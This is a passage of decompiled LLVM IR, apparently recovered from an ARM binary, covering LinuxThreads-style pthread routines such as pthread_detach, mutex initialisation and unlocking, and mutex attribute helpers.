  %v3_eecc = load i8, i8* %v2_eecc, align 1
  %v2_eed0 = icmp eq i8 %v3_eecc, 0
  br i1 %v2_eed0, label %dec_label_pc_eed8, label %dec_label_pc_ef88

dec_label_pc_eed8:                                ; preds = %dec_label_pc_eecc
  %v2_eedc = ptrtoint i32* %stack_var_-36 to i32
  %v2_eee0 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_ee30, i32 %v2_eedc)
  %v1_eee8 = add i32 %v0_ee30, 66
  %v2_eee8 = inttoptr i32 %v1_eee8 to i8*
  %v3_eee8 = load i8, i8* %v2_eee8, align 1
  %v2_eeec = icmp eq i8 %v3_eee8, 0
  br i1 %v2_eeec, label %dec_label_pc_ef08, label %dec_label_pc_eef4

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eed8
  %v1_eef8 = add i32 %v0_ee30, 64
  %v2_eef8 = inttoptr i32 %v1_eef8 to i8*
  %v3_eef8 = load i8, i8* %v2_eef8, align 1
  %v2_eefc = icmp eq i8 %v3_eef8, 0
  br i1 %v2_eefc, label %dec_label_pc_ef14, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_eed8
  %v1_ef0c = load i32, i32* @r4, align 4
  %v2_ef0c = add i32 %v1_ef0c, 56
  %v3_ef0c = inttoptr i32 %v2_ef0c to i32*
  store i32 %v0_ee30, i32* %v3_ef0c, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_ef08
  %storemerge = phi i32 [ 0, %dec_label_pc_ef08 ], [ 1, %dec_label_pc_eef4 ]
  store i32 %storemerge, i32* @r6, align 4
  %v0_ef14 = load i32, i32* @r5, align 4
  %v1_ef18 = call i32 @__pthread_unlock(i32 %v0_ef14)
  %v0_ef1c = load i32, i32* @r6, align 4
  %v2_ef1c = icmp eq i32 %v0_ef1c, 0
  store i32 %v0_ee30, i32* @r0, align 4
  br i1 %v2_ef1c, label %dec_label_pc_ef34, label %dec_label_pc_ef24

dec_label_pc_ef24:                                ; preds = %dec_label_pc_ef14
  %v2_ef2c = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_ee30, i32 0)
  br label %dec_label_pc_ef70

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ef14
  %v1_ef38 = call i32 @_suspend.10(i32 %v0_ee30)
  %v0_ef3c = load i32, i32* @r6, align 4
  %v2_ef44 = call i32 @___pthread_set_own_extricate_if.8(i32 %v0_ee30, i32 %v0_ef3c)
  %v1_ef4c = add i32 %v0_ee30, 440
  %v2_ef4c = inttoptr i32 %v1_ef4c to i8*
  %v3_ef4c = load i8, i8* %v2_ef4c, align 1
  %v2_ef50 = icmp eq i8 %v3_ef4c, 0
  br i1 %v2_ef50, label %dec_label_pc_ef7c, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef34
  %v1_ef5c = add i32 %v0_ee30, 64
  %v2_ef5c = inttoptr i32 %v1_ef5c to i8*
  %v3_ef5c = load i8, i8* %v2_ef5c, align 1
  %v2_ef60 = icmp eq i8 %v3_ef5c, 0
  br i1 %v2_ef60, label %dec_label_pc_ef68, label %dec_label_pc_ef7c

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef58
  store i8 0, i8* %v2_ef4c, align 1
  br label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef24, %dec_label_pc_ef68
  %v2_ef78 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_ee24)
  br label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef58, %dec_label_pc_ef34, %dec_label_pc_ef70
  %v0_ef80 = load i32, i32* @r5, align 4
  %v2_ef84 = call i32 @__pthread_lock(i32 %v0_ef80, i32 %v0_ee30)
  br label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %dec_label_pc_eecc, %dec_label_pc_ef7c
  %v0_ef88 = load i32, i32* @r8, align 4
  %v2_ef88 = icmp eq i32 %v0_ef88, 0
  br i1 %v2_ef88, label %.thread1, label %bb19

.thread1:                                         ; preds = %dec_label_pc_ef88
  %v0_ef902 = load i32, i32* @r5, align 4
  br label %bb20

bb19:                                             ; preds = %dec_label_pc_ef88
  %v1_ef8c = load i32, i32* @r4, align 4
  %v2_ef8c = add i32 %v1_ef8c, 48
  %v3_ef8c = inttoptr i32 %v2_ef8c to i32*
  %v4_ef8c = load i32, i32* %v3_ef8c, align 4
  %v0_ef90 = load i32, i32* @r5, align 4
  %v3_ef94 = inttoptr i32 %v0_ef88 to i32*
  store i32 %v4_ef8c, i32* %v3_ef94, align 4
  br label %bb20

bb20:                                             ; preds = %.thread1, %bb19
  %v0_ef903 = phi i32 [ %v0_ef902, %.thread1 ], [ %v0_ef90, %bb19 ]
  %v1_ef98 = call i32 @__pthread_unlock(i32 %v0_ef903)
  %v2_efa0 = load i32, i32* @global_var_2b484.197, align 4
  %v1_efa4 = icmp slt i32 %v2_efa0, 0
  br i1 %v1_efa4, label %dec_label_pc_efe8, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %bb20
  store i32 %v0_ee30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_efd8.dec_label_pc_efbc_crit_edge, %dec_label_pc_efac
  %v2_efc4 = phi i32 [ %v2_efc4.pre, %dec_label_pc_efd8.dec_label_pc_efbc_crit_edge ], [ %v2_efa0, %dec_label_pc_efac ]
  store i32 %v2_ee24, i32* @r1, align 4
  store i32 %v2_efc4, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_efcc = call i32 @__libc_write(i32 %v2_efc4, i32 %v2_ee24)
  %v3_efd0 = icmp eq i32 %v2_efcc, -1
  br i1 %v3_efd0, label %dec_label_pc_efd8, label %dec_label_pc_efe8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_efbc
  %v0_efd8 = call i32 @__errno_location()
  %v1_efdc = inttoptr i32 %v0_efd8 to i32*
  %v2_efdc = load i32, i32* %v1_efdc, align 4
  %v7_efe0 = icmp eq i32 %v2_efdc, 4
  br i1 %v7_efe0, label %dec_label_pc_efd8.dec_label_pc_efbc_crit_edge, label %dec_label_pc_efe8

dec_label_pc_efd8.dec_label_pc_efbc_crit_edge:    ; preds = %dec_label_pc_efd8
  %v2_efc4.pre = load i32, i32* @global_var_2b484.197, align 4
  br label %dec_label_pc_efbc

dec_label_pc_efe8:                                ; preds = %dec_label_pc_efbc, %dec_label_pc_efd8, %bb20
  br label %dec_label_pc_efec

dec_label_pc_efec:                                ; preds = %dec_label_pc_eebc, %dec_label_pc_ee94, %dec_label_pc_ee78, %dec_label_pc_efe8
  %v20_eff0 = phi i32 [ 22, %dec_label_pc_eebc ], [ 35, %dec_label_pc_ee94 ], [ 3, %dec_label_pc_ee78 ], [ 0, %dec_label_pc_efe8 ]
  ret i32 %v20_eff0

; uselistorder directives
  uselistorder i32 %v2_efc4, { 1, 0 }
  uselistorder i32 %v0_ee60, { 2, 1, 0, 3 }
  uselistorder i32 %v5_ee40, { 1, 0 }
  uselistorder i32 %v0_ee30, { 2, 3, 1, 6, 7, 5, 8, 4, 9, 0, 11, 10, 12, 13 }
  uselistorder i32 %v2_ee24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 7, 6, 5, 4, 2, 3, 1, 0, 8 }
  uselistorder i32 (i32)* @_suspend.10, { 1, 0 }
  uselistorder i32 66, { 1, 2, 3, 4, 5, 11, 7, 6, 0, 8, 9, 10 }
  uselistorder i32 (i32, i32)* @___pthread_set_own_extricate_if.8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_efec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_efe8, { 1, 0, 2 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_ef88, { 1, 0 }
  uselistorder label %dec_label_pc_ef7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef70, { 1, 0 }
  uselistorder label %dec_label_pc_ef14, { 1, 0 }
  uselistorder label %dec_label_pc_eebc, { 1, 0 }
}

define i32 @pthread_detach(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v3_f000 = load i32, i32* @r4, align 4
  %v3_f00c = urem i32 %arg1, 1024
  %v4_f010 = mul nuw nsw i32 %v3_f00c, 16
  %v5_f010 = add i32 %v4_f010, ptrtoint (i32* @global_var_270a0.207 to i32)
  %v2_f014 = ptrtoint i32* %stack_var_-168 to i32
  %v2_f024 = call i32 @__pthread_lock(i32 %v5_f010, i32 0)
  %v0_f028 = load i32, i32* @r5, align 4
  %v1_f028 = add i32 %v0_f028, 8
  %v2_f028 = inttoptr i32 %v1_f028 to i32*
  %v3_f028 = load i32, i32* %v2_f028, align 4
  %v2_f02c = icmp eq i32 %v3_f028, 0
  br i1 %v2_f02c, label %dec_label_pc_f040, label %dec_label_pc_f034

dec_label_pc_f034:                                ; preds = %entry
  %v1_f034 = add i32 %v3_f028, 16
  %v2_f034 = inttoptr i32 %v1_f034 to i32*
  %v3_f034 = load i32, i32* %v2_f034, align 4
  %v1_f038 = load i32, i32* @r6, align 4
  %v9_f038 = icmp eq i32 %v3_f034, %v1_f038
  br i1 %v9_f038, label %dec_label_pc_f050, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %dec_label_pc_f034, %entry
  %v1_f044 = call i32 @__pthread_unlock(i32 %v0_f028)
  br label %dec_label_pc_f0f0

dec_label_pc_f050:                                ; preds = %dec_label_pc_f034
  %v1_f050 = add i32 %v3_f028, 45
  %v2_f050 = inttoptr i32 %v1_f050 to i8*
  %v3_f050 = load i8, i8* %v2_f050, align 1
  %v4_f050 = zext i8 %v3_f050 to i32
  store i32 %v4_f050, i32* %r4.global-to-local, align 4
  %v2_f054 = icmp eq i8 %v3_f050, 0
  br i1 %v2_f054, label %dec_label_pc_f06c, label %dec_label_pc_f05c

dec_label_pc_f05c:                                ; preds = %dec_label_pc_f050
  %v1_f060 = call i32 @__pthread_unlock(i32 %v0_f028)
  br label %dec_label_pc_f0f0

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f050
  %v1_f06c = add i32 %v3_f028, 56
  %v2_f06c = inttoptr i32 %v1_f06c to i32*
  %v3_f06c = load i32, i32* %v2_f06c, align 4
  %v2_f070 = icmp eq i32 %v3_f06c, 0
  br i1 %v2_f070, label %dec_label_pc_f088, label %dec_label_pc_f078

dec_label_pc_f078:                                ; preds = %dec_label_pc_f06c
  %v1_f07c = call i32 @__pthread_unlock(i32 %v0_f028)
  %v0_f080 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f0f0

dec_label_pc_f088:                                ; preds = %dec_label_pc_f06c
  %v1_f088 = add i32 %v3_f028, 44
  %v2_f088 = inttoptr i32 %v1_f088 to i8*
  %v3_f088 = load i8, i8* %v2_f088, align 1
  %v4_f088 = zext i8 %v3_f088 to i32
  store i32 %v4_f088, i32* @r4, align 4
  store i8 1, i8* %v2_f050, align 1
  %v0_f094 = load i32, i32* @r5, align 4
  %v1_f098 = call i32 @__pthread_unlock(i32 %v0_f094)
  %v0_f09c = load i32, i32* @r4, align 4
  %v2_f09c = icmp eq i32 %v0_f09c, 0
  br i1 %v2_f09c, label %dec_label_pc_f0ec, label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %dec_label_pc_f088
  %v2_f0a8 = load i32, i32* @global_var_2b484.197, align 4
  %v1_f0ac = icmp slt i32 %v2_f0a8, 0
  br i1 %v1_f0ac, label %dec_label_pc_f0ec, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f0a4
  %v0_f0b4 = call i32 @_thread_self.9()
  store i32 %v0_f0b4, i32* %stack_var_-168, align 4
  br label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0dc, %dec_label_pc_f0b4
  store i32 %v2_f014, i32* @r1, align 4
  %v2_f0c8 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_f0c8, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_f0d0 = call i32 @__libc_write(i32 %v2_f0c8, i32 %v2_f014)
  %v3_f0d4 = icmp eq i32 %v2_f0d0, -1
  br i1 %v3_f0d4, label %dec_label_pc_f0dc, label %dec_label_pc_f0ec

dec_label_pc_f0dc:                                ; preds = %dec_label_pc_f0c0
  %v0_f0dc = call i32 @__errno_location()
  %v1_f0e0 = inttoptr i32 %v0_f0dc to i32*
  %v2_f0e0 = load i32, i32* %v1_f0e0, align 4
  %v7_f0e4 = icmp eq i32 %v2_f0e0, 4
  br i1 %v7_f0e4, label %dec_label_pc_f0c0, label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0c0, %dec_label_pc_f0dc, %dec_label_pc_f0a4, %dec_label_pc_f088
  br label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f078, %dec_label_pc_f05c, %dec_label_pc_f040, %dec_label_pc_f0ec
  %v17_f0f4 = phi i32 [ %v0_f080, %dec_label_pc_f078 ], [ 22, %dec_label_pc_f05c ], [ 3, %dec_label_pc_f040 ], [ 0, %dec_label_pc_f0ec ]
  store i32 %v3_f000, i32* %r4.global-to-local, align 4
  ret i32 %v17_f0f4

; uselistorder directives
  uselistorder i32 %v0_f028, { 1, 2, 0, 3 }
  uselistorder i32 %v2_f014, { 1, 0 }
  uselistorder i32 ()* @_thread_self.9, { 2, 1, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_270a0.207 to i32), { 0, 1, 2, 5, 6, 3, 11, 7, 12, 9, 4, 8, 10 }
  uselistorder label %dec_label_pc_f0f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f0ec, { 1, 0, 2, 3 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v2_f104 = ptrtoint i32* %stack_var_-12 to i32
  %v2_f10c = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-12)
  %v3_f118 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-12, i32 1)
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_f1383 = icmp eq i32 %storemerge1, 0
  br i1 %v2_f1383, label %dec_label_pc_f148, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %entry, %dec_label_pc_f128
  %v1_f13c6.in = phi i32 [ %storemerge, %dec_label_pc_f128 ], [ %storemerge1, %entry ]
  %v1_f13c6 = add i32 %v1_f13c6.in, 56
  %v4_f130 = call i32 @pthread_mutex_init(i32 %v1_f13c6, i32* nonnull %stack_var_-12)
  %v0_f134 = load i32, i32* %r4.global-to-local, align 4
  %v1_f134 = add i32 %v0_f134, 32
  %v2_f134 = inttoptr i32 %v1_f134 to i32*
  %storemerge = load i32, i32* %v2_f134, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_f138 = icmp eq i32 %storemerge, 0
  br i1 %v2_f138, label %dec_label_pc_f148, label %dec_label_pc_f128

dec_label_pc_f148:                                ; preds = %dec_label_pc_f128, %entry
  %v1_f14c = call i32 @pthread_mutexattr_destroy(i32 %v2_f104)
  ret i32 %v1_f14c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 0, 2, 1 }
  uselistorder i32 (i32*, i32)* @__pthread_mutexattr_setkind_np, { 2, 0, 1 }
  uselistorder i32 (i32*)* @pthread_mutexattr_init, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f128, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_f1a8 = add i32 %arg1, 20
  %v3_f1a8 = inttoptr i32 %v2_f1a8 to i32*
  store i32 0, i32* %v3_f1a8, align 4
  %v2_f1ac = icmp eq i32* %arg2, null
  store i32 3, i32* %ip.global-to-local, align 4
  br i1 %v2_f1ac, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v3_f1b4 = load i32, i32* %arg2, align 4
  store i32 %v3_f1b4, i32* %ip.global-to-local, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v0_f1bc = load i32, i32* %r3.global-to-local, align 4
  %v2_f1bc = add i32 %arg1, 16
  %v3_f1bc = inttoptr i32 %v2_f1bc to i32*
  store i32 %v0_f1bc, i32* %v3_f1bc, align 4
  %v0_f1c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_f1c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_f1c4 = add i32 %v1_f1c4, 12
  %v3_f1c4 = inttoptr i32 %v2_f1c4 to i32*
  store i32 %v0_f1c4, i32* %v3_f1c4, align 4
  %v1_f1c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_f1c8 = add i32 %v1_f1c8, 8
  %v3_f1c8 = inttoptr i32 %v2_f1c8 to i32*
  store i32 0, i32* %v3_f1c8, align 4
  %v1_f1cc = load i32, i32* %r2.global-to-local, align 4
  %v2_f1cc = add i32 %v1_f1cc, 4
  %v3_f1cc = inttoptr i32 %v2_f1cc to i32*
  store i32 0, i32* %v3_f1cc, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_f1d4 = add i32 %arg1, 12
  %v2_f1d4 = inttoptr i32 %v1_f1d4 to i32*
  %v3_f1d4 = load i32, i32* %v2_f1d4, align 4
  switch i32 %v3_f1d4, label %dec_label_pc_f1f4 [
    i32 0, label %dec_label_pc_f1fc
    i32 1, label %dec_label_pc_f1fc
    i32 2, label %dec_label_pc_f20c
    i32 3, label %dec_label_pc_f20c
  ]

dec_label_pc_f1f4:                                ; preds = %entry
  ret i32 22

dec_label_pc_f1fc:                                ; preds = %entry, %entry
  %v1_f1fc = add i32 %arg1, 16
  %v2_f1fc = inttoptr i32 %v1_f1fc to i32*
  %v3_f1fc = load i32, i32* %v2_f1fc, align 4
  %v1_f200 = urem i32 %v3_f1fc, 2
  %v2_f200 = icmp eq i32 %v1_f200, 0
  br i1 %v2_f200, label %dec_label_pc_f220, label %dec_label_pc_f218

dec_label_pc_f20c:                                ; preds = %entry, %entry
  %v1_f20c = add i32 %arg1, 16
  %v2_f20c = inttoptr i32 %v1_f20c to i32*
  %v3_f20c = load i32, i32* %v2_f20c, align 4
  %v2_f210 = icmp eq i32 %v3_f20c, 0
  br i1 %v2_f210, label %dec_label_pc_f220, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %dec_label_pc_f1fc, %dec_label_pc_f20c
  ret i32 16

dec_label_pc_f220:                                ; preds = %dec_label_pc_f1fc, %dec_label_pc_f20c
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_f220, { 1, 0 }
  uselistorder label %dec_label_pc_f218, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg2, 4
  %. = select i1 %tmp, i32 0, i32 22
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  %v0_f250.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_f250 = phi i32 [ 22, %entry ], [ %v0_f250.pre, %bb ]
  ret i32 %v0_f250

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f258 = load i32, i32* %arg1, align 4
  %v2_f260 = inttoptr i32 %arg2 to i32*
  store i32 %v2_f258, i32* %v2_f260, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %arg1.cmp = icmp ugt i32 %arg1, 1
  br i1 %arg1.cmp, label %bb, label %bb2

bb:                                               ; preds = %.thread, %bb3, %entry
  %merge = phi i32 [ 22, %entry ], [ 38, %bb3 ], [ 0, %.thread ]
  ret i32 %merge

bb2:                                              ; preds = %entry
  %v2_f280 = icmp eq i32 %arg1, 0
  br i1 %v2_f280, label %.thread, label %bb3

bb3:                                              ; preds = %bb2
  br label %bb

.thread:                                          ; preds = %bb2
  br label %bb

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  store i32 62120, i32* @lr, align 4
  %v4_f2a4 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_2be68.485 to i32), i32* null)
  %v3_f2b0 = call i32 @pthread_cond_init(i32* nonnull @global_var_2be80.487, i32 0)
  %v2_f2b8 = load i32, i32* @global_var_2be8c.489, align 4
  %v1_f2c0 = add i32 %v2_f2b8, 4
  %v7_f2c4 = icmp sgt i32 %v2_f2b8, 2147483643
  br i1 %v7_f2c4, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_f2c0, %entry ]
  store i32 %storemerge, i32* @global_var_2be8c.489, align 4
  ret i32 %v3_f2b0

; uselistorder directives
  uselistorder i32 %v2_f2b8, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_thread_self.11() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_f2e8 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_f2ec = load i32, i32* @sp, align 4
  %v3_f2ec = icmp ult i32 %v0_f2ec, %v2_f2e8
  %v1_f2f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f2f0, i32* @r1, align 4
  br i1 %v3_f2ec, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_f30c, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_f30c ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_f300 = load i32, i32* @global_var_2be50.182, align 4
  %v3_f304 = icmp ult i32 %v0_f2ec, %v2_f300
  br i1 %v3_f304, label %bb4, label %dec_label_pc_f30c

dec_label_pc_f30c:                                ; preds = %bb3
  %v2_f310 = load i32, i32* @global_var_2be54.184, align 4
  %v3_f314 = icmp ult i32 %v0_f2ec, %v2_f310
  br i1 %v3_f314, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_f30c, %bb3
  %v2_f324 = load i32, i32* @global_var_30238.188, align 4
  store i32 %v2_f324, i32* @r2, align 4
  %v3_f328 = and i32 %v1_f2f0, -2097152
  %v4_f328 = xor i32 %v3_f328, -2097152
  %v2_f330 = icmp eq i32 %v2_f324, 0
  %v1_f334 = sub i32 -477, %v4_f328
  br i1 %v2_f330, label %dec_label_pc_f340, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %bb4
  %v1_f33c = call i32 @__pthread_find_self(i32 %v1_f334)
  br label %dec_label_pc_f340

dec_label_pc_f340:                                ; preds = %bb4, %dec_label_pc_f33c
  %v0_f340 = phi i32 [ %v1_f334, %bb4 ], [ %v1_f33c, %dec_label_pc_f33c ]
  %v1_f340 = add i32 %v0_f340, -3
  ret i32 %v1_f340

; uselistorder directives
  uselistorder i32 %v1_f334, { 1, 0 }
  uselistorder label %dec_label_pc_f340, { 1, 0 }
}

define i32 @pthread_mutex_unlock() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_f360 = load i32, i32* @r0, align 4
  %v1_f360 = add i32 %v0_f360, 12
  %v2_f360 = inttoptr i32 %v1_f360 to i32*
  %v3_f360 = load i32, i32* %v2_f360, align 4
  %v3_f364 = load i32, i32* @r4, align 4
  store i32 %v3_f364, i32* %stack_var_-12, align 4
  %v6_f364 = load i32, i32* @r5, align 4
  store i32 %v0_f360, i32* @r5, align 4
  %v7_f36c = icmp eq i32 %v3_f360, 3
  store i1 %v7_f36c, i1* @cpsr_z, align 1
  switch i32 %v3_f360, label %dec_label_pc_f388 [
    i32 0, label %dec_label_pc_f390
    i32 1, label %dec_label_pc_f39c
    i32 2, label %dec_label_pc_f3dc
    i32 3, label %dec_label_pc_f410
  ]

dec_label_pc_f388:                                ; preds = %entry
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 22

dec_label_pc_f390:                                ; preds = %entry
  %v1_f390 = add i32 %v0_f360, 16
  %v1_f394 = call i32 @__pthread_unlock(i32 %v1_f390)
  br label %dec_label_pc_f418

dec_label_pc_f39c:                                ; preds = %entry
  %v0_f39c = call i32 @_thread_self.11()
  %v0_f3a0 = load i32, i32* @r5, align 4
  %v1_f3a0 = add i32 %v0_f3a0, 8
  %v2_f3a0 = inttoptr i32 %v1_f3a0 to i32*
  %v3_f3a0 = load i32, i32* %v2_f3a0, align 4
  %v9_f3a4 = icmp eq i32 %v3_f3a0, %v0_f39c
  store i1 %v9_f3a4, i1* @cpsr_z, align 1
  br i1 %v9_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_f420

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f39c
  %v1_f3ac = add i32 %v0_f3a0, 4
  %v2_f3ac = inttoptr i32 %v1_f3ac to i32*
  %v3_f3ac = load i32, i32* %v2_f3ac, align 4
  %v2_f3b0 = icmp eq i32 %v3_f3ac, 0
  store i1 %v2_f3b0, i1* @cpsr_z, align 1
  %tmp5 = icmp slt i32 %v3_f3ac, 1
  br i1 %tmp5, label %dec_label_pc_f3c8, label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %dec_label_pc_f3ac
  %v1_f3b8 = add i32 %v3_f3ac, -1
  store i32 %v1_f3b8, i32* %v2_f3ac, align 4
  %v2_f3c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f3c4, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 0

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3ac
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v2_f3a0, align 4
  %v0_f3d0 = load i32, i32* @r5, align 4
  %v1_f3d0 = add i32 %v0_f3d0, 16
  %v1_f3d4 = call i32 @__pthread_unlock(i32 %v1_f3d0)
  br label %dec_label_pc_f408

dec_label_pc_f3dc:                                ; preds = %entry
  %v0_f3dc = call i32 @_thread_self.11()
  %v0_f3e0 = load i32, i32* @r5, align 4
  %v1_f3e0 = add i32 %v0_f3e0, 8
  %v2_f3e0 = inttoptr i32 %v1_f3e0 to i32*
  %v3_f3e0 = load i32, i32* %v2_f3e0, align 4
  %v9_f3e4 = icmp eq i32 %v3_f3e0, %v0_f3dc
  store i1 %v9_f3e4, i1* @cpsr_z, align 1
  br i1 %v9_f3e4, label %dec_label_pc_f3ec, label %dec_label_pc_f420

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3dc
  %v1_f3ec = add i32 %v0_f3e0, 16
  %v2_f3ec = inttoptr i32 %v1_f3ec to i32*
  %v3_f3ec = load i32, i32* %v2_f3ec, align 4
  %v2_f3f0 = icmp eq i32 %v3_f3ec, 0
  store i1 %v2_f3f0, i1* @cpsr_z, align 1
  br i1 %v2_f3f0, label %dec_label_pc_f420, label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3ec
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v2_f3e0, align 4
  %v0_f400 = load i32, i32* @r5, align 4
  %v1_f400 = add i32 %v0_f400, 16
  %v1_f404 = inttoptr i32 %v1_f400 to i32*
  %v2_f404 = call i32 @__pthread_alt_unlock(i32* %v1_f404)
  br label %dec_label_pc_f408

dec_label_pc_f408:                                ; preds = %dec_label_pc_f3c8, %dec_label_pc_f3f8
  %v0_f408 = load i32, i32* @r4, align 4
  %v2_f40c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f40c, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 %v0_f408

dec_label_pc_f410:                                ; preds = %entry
  %v1_f410 = add i32 %v0_f360, 16
  %v1_f414 = inttoptr i32 %v1_f410 to i32*
  %v2_f414 = call i32 @__pthread_alt_unlock(i32* %v1_f414)
  br label %dec_label_pc_f418

